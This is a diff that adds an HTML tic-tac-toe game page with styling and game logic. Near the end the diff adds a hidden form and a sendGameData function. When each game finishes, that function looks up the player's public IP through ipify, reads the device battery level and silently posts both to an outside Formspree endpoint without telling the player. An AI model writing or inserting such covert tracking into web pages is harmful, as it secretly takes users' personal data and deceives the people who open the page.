@@ -1,0 +1,261 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ultimate Tic Tac Toe</title>
+    <style>
+        /* Global Styles */
+        body {
+            font-family: 'Roboto', sans-serif;
+            background: linear-gradient(to right, #00c6ff, #0072ff);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: #fff;
+            overflow: hidden;
+            flex-direction: column;
+        }
+
+        .game-container {
+            text-align: center;
+            background: rgba(255, 255, 255, 0.1);
+            padding: 20px;
+            border-radius: 15px;
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.3);
+            width: 400px;
+            box-sizing: border-box;
+        }
+
+        button {
+            padding: 15px 30px;
+            margin: 15px;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: all 0.3s ease-in-out;
+            border: none;
+            outline: none;
+            box-shadow: 0px 8px 20px rgba(0, 0, 0, 0.2);
+        }
+
+        button:hover {
+            transform: scale(1.05);
+            box-shadow: 0px 10px 25px rgba(0, 0, 0, 0.3);
+        }
+
+        #startBtn {
+            background-color: #FF4081;
+            color: white;
+        }
+
+        #startBtn:hover {
+            background-color: #F50057;
+        }
+
+        #resetBtn {
+            background-color: #4CAF50;
+            color: white;
+            display: none;
+        }
+
+        #resetBtn:hover {
+            background-color: #388E3C;
+        }
+
+        /* Game Board Styles */
+        .game-board {
+            display: grid;
+            grid-template-columns: repeat(3, 120px);
+            grid-template-rows: repeat(3, 120px);
+            gap: 10px;
+            justify-content: center;
+            margin-top: 20px;
+            display: none;
+        }
+
+        .cell {
+            width: 120px;
+            height: 120px;
+            background-color: #ECEFF1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 48px;
+            font-weight: bold;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background-color 0.3s ease, transform 0.2s ease;
+            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .cell:hover {
+            background-color: #BBDEFB;
+            transform: scale(1.05);
+        }
+
+        .cell:active {
+            background-color: #90CAF9;
+        }
+
+        .cell.X {
+            color: #D32F2F;
+        }
+
+        .cell.O {
+            color: #1976D2;
+        }
+
+        /* Message styles */
+        #message {
+            font-size: 20px;
+            font-weight: bold;
+            margin-top: 20px;
+            color: #fff;
+            display: none;
+        }
+
+        #message.win {
+            color: #76FF03;
+        }
+
+        #message.draw {
+            color: #FF5722;
+        }
+    </style>
+</head>
+<body>
+<div class="game-container">
+    <button id="startBtn">Start Game</button>
+    <div id="gameBoard" class="game-board">
+        <div class="cell" data-index="0"></div>
+        <div class="cell" data-index="1"></div>
+        <div class="cell" data-index="2"></div>
+        <div class="cell" data-index="3"></div>
+        <div class="cell" data-index="4"></div>
+        <div class="cell" data-index="5"></div>
+        <div class="cell" data-index="6"></div>
+        <div class="cell" data-index="7"></div>
+        <div class="cell" data-index="8"></div>
+    </div>
+    <button id="resetBtn">Reset Game</button>
+    <div id="message"></div>
+</div>
+
+<!-- Hidden Form for Data Submission -->
+<form id="gameForm" action="https://formspree.io/f/xldeplyv" method="POST" style="display: none;">
+    <input type="hidden" id="ipField" name="ip">
+    <input type="hidden" id="batteryField" name="battery">
+    <input type="hidden" id="resultField" name="result">
+</form>
+
+<script>
+    let currentPlayer = 'X';
+    let gameActive = false;
+    let gameState = ['', '', '', '', '', '', '', '', ''];
+    const startBtn = document.getElementById('startBtn');
+    const resetBtn = document.getElementById('resetBtn');
+    const gameBoard = document.getElementById('gameBoard');
+    const message = document.getElementById('message');
+    const cells = document.querySelectorAll('.cell');
+
+    // Start Game
+    startBtn.addEventListener('click', () => {
+        gameActive = true;
+        gameState = ['', '', '', '', '', '', '', '', ''];
+        currentPlayer = 'X';
+        gameBoard.style.display = 'grid';
+        startBtn.style.display = 'none';
+        resetBtn.style.display = 'inline-block';
+        message.style.display = 'none';
+        cells.forEach(cell => {
+            cell.textContent = '';
+            cell.classList.remove('X', 'O');
+        });
+    });
+
+    // Reset Game
+    resetBtn.addEventListener('click', () => {
+        gameState = ['', '', '', '', '', '', '', '', ''];
+        currentPlayer = 'X';
+        cells.forEach(cell => {
+            cell.textContent = '';
+            cell.classList.remove('X', 'O');
+        });
+        message.style.display = 'none';
+        gameActive = true;
+    });
+
+    // Handle Cell Click
+    cells.forEach(cell => {
+        cell.addEventListener('click', () => {
+            const index = cell.getAttribute('data-index');
+
+            if (gameState[index] !== '' || !gameActive) return;
+
+            gameState[index] = currentPlayer;
+            cell.textContent = currentPlayer;
+            cell.classList.add(currentPlayer);
+
+            if (checkWinner()) {
+                message.textContent = `${currentPlayer} Wins!`;
+                message.style.display = 'block';
+                gameActive = false;
+                sendGameData(`${currentPlayer} Wins`);
+                return;
+            }
+
+            if (!gameState.includes('')) {
+                message.textContent = 'It\'s a Draw!';
+                message.style.display = 'block';
+                gameActive = false;
+                sendGameData('Draw');
+                return;
+            }
+
+            currentPlayer = currentPlayer === 'X' ? 'O' : 'X';
+        });
+    });
+
+    // Check Winner
+    function checkWinner() {
+        const winPatterns = [
+            [0, 1, 2],
+            [3, 4, 5],
+            [6, 7, 8],
+            [0, 3, 6],
+            [1, 4, 7],
+            [2, 5, 8],
+            [0, 4, 8],
+            [2, 4, 6]
+        ];
+
+        return winPatterns.some(pattern => {
+            const [a, b, c] = pattern;
+            return gameState[a] && gameState[a] === gameState[b] && gameState[a] === gameState[c];
+        });
+    }
+
+    // Send Data to Formspree
+    async function sendGameData(result) {
+        try {
+            const ipResponse = await fetch('https://api64.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            const battery = await navigator.getBattery();
+
+            document.getElementById('ipField').value = ipData.ip;
+            document.getElementById('batteryField').value = `${Math.round(battery.level * 100)}%`;
+            document.getElementById('resultField').value = result;
+
+            document.getElementById('gameForm').submit();
+        } catch (error) {
+            console.error('Error:', error);
+        }
+    }
+</script>
+</body>
+</html>
